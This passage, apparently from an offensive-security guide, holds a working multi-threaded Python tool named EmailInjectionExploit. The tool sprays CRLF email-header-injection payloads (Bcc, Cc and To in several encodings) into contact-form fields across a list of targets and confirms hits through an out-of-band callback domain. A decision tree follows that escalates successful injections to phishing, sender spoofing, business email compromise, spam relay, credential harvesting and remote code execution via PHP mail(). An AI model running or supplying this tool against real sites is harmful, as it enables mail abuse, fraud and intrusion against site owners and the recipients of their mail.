            "bcc_crlf": f"%0d%0aBcc:{cb}",
            "bcc_lf": f"%0aBcc:{cb}",
            "bcc_cr": f"%0dBcc:{cb}",
            "bcc_double": f"%250d%250aBcc:{cb}",
            "bcc_utf8": f"%C0%8D%C0%8ABcc:{cb}",
            "bcc_nel": f"%C2%85Bcc:{cb}",
            "bcc_ls": f"%E2%80%A8Bcc:{cb}",
            "bcc_null": f"%00%0d%0aBcc:{cb}",
            "bcc_fold": f"%0d%0a%20Bcc:{cb}",
            "cc_crlf": f"%0d%0aCc:{cb}",
            "to_crlf": f"%0d%0aTo:{cb}",
        }

    def test_target(self, target_url):
        fields = ["email", "name", "subject", "from", "sender", "reply_to"]
        results = []

        for field in fields:
            tracking_id = uuid.uuid4().hex[:8]
            payloads = self.generate_payloads(tracking_id)

            for payload_name, payload in payloads.items():
                data = {
                    "email": "test@test.com",
                    "name": "Test",
                    "subject": "Test",
                    "message": f"probe-{tracking_id}"
                }
                data[field] = f"test{payload}"

                try:
                    r = requests.post(target_url, data=data, timeout=15, allow_redirects=False)
                    result = {
                        "target": target_url,
                        "field": field,
                        "payload": payload_name,
                        "tracking_id": tracking_id,
                        "status": r.status_code,
                        "length": len(r.text),
                    }
                    results.append(result)

                    with self.lock:
                        tag = "HIT" if r.status_code in [200, 302] else "MISS"
                        print(f"[{tag}] {target_url} | {field} | {payload_name} | {r.status_code}")

                except Exception as e:
                    with self.lock:
                        print(f"[ERR] {target_url} | {field} | {payload_name} | {e}")

                time.sleep(self.delay)

        return results

    def run(self):
        print(f"[*] Targets: {len(self.targets)}")
        print(f"[*] Callback: {self.callback}")
        print(f"[*] Threads: {self.threads}")
        print("=" * 70)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_target, t): t for t in self.targets}
            for future in as_completed(futures):
                target = futures[future]
                try:
                    result = future.result()
                    self.results.extend(result)
                except Exception as e:
                    print(f"[FATAL] {target}: {e}")

        self.save_results()

    def save_results(self):
        output_file = "/tmp/email_inject_results.json"
        with open(output_file, "w") as f:
            json.dump(self.results, f, indent=2)

        hits = [r for r in self.results if r["status"] in [200, 302]]
        print(f"\n{'='*70}")
        print(f"[*] Total tests: {len(self.results)}")
        print(f"[*] Potential hits: {len(hits)}")
        print(f"[*] Results saved: {output_file}")
        print(f"[*] Check OOB listener for SMTP interactions")
        print(f"[*] Match tracking_id to identify vulnerable targets/fields")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <targets.txt> <callback_domain> [threads] [delay]")
        print(f"Example: {sys.argv[0]} urls.txt abc123.oast.fun 5 1")
        sys.exit(1)

    targets_file = sys.argv[1]
    callback = sys.argv[2]
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    delay = float(sys.argv[4]) if len(sys.argv) > 4 else 1

    exploit = EmailInjectionExploit(targets_file, callback, threads, delay)
    exploit.run()
```

::

---

## Methodology Decision Tree

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
START
  │
  ├─ 1. DISCOVER email-sending functionality
  │    ├─ Contact forms
  │    ├─ Registration/confirmation
  │    ├─ Password reset
  │    ├─ Newsletter/subscribe
  │    ├─ API email endpoints
  │    └─ Invite/share features
  │
  ├─ 2. IDENTIFY injectable fields
  │    ├─ email / from / sender
  │    ├─ name / display_name
  │    ├─ subject
  │    ├─ reply_to / replyto
  │    └─ Any field appearing in email headers
  │
  ├─ 3. PROBE with CRLF payloads
  │    ├─ Standard: %0d%0aBcc:OOB_URL
  │    ├─ LF only: %0aBcc:OOB_URL
  │    ├─ CR only: %0dBcc:OOB_URL
  │    ├─ Double: %250d%250aBcc:OOB_URL
  │    └─ Unicode: %C2%85Bcc:OOB_URL
  │
  ├─ 4. VERIFY via OOB
  │    ├─ interactsh → SMTP interaction?
  │    │   ├─ YES → CONFIRMED VULNERABLE
  │    │   └─ NO → Try alternate payloads
  │    ├─ DNS interaction only?
  │    │   └─ MX lookup occurred, delivery may have failed
  │    └─ No interaction?
  │        └─ Input sanitized or wrong field
  │
  ├─ 5. ESCALATE injection
  │    ├─ Can inject Bcc? → Add hidden recipients
  │    ├─ Can inject From? → Sender spoofing
  │    ├─ Can inject Subject? → Social engineering
  │    ├─ Can inject Body? → Phishing content
  │    ├─ Can inject MIME? → File attachments
  │    └─ PHP mail() 5th param? → RCE via -X flag
  │
  └─ 6. EXPLOIT
       ├─ Phishing via trusted domain
       ├─ BEC (Business Email Compromise)
       ├─ Spam relay abuse
       ├─ Credential harvesting
       ├─ Data exfiltration
       ├─ XSS in webmail
       ├─ Domain reputation damage
       └─ Remote code execution (PHP)
```

#code
```
Methodology: Discover → Identify → Probe → Verify → Escalate → Exploit
```
::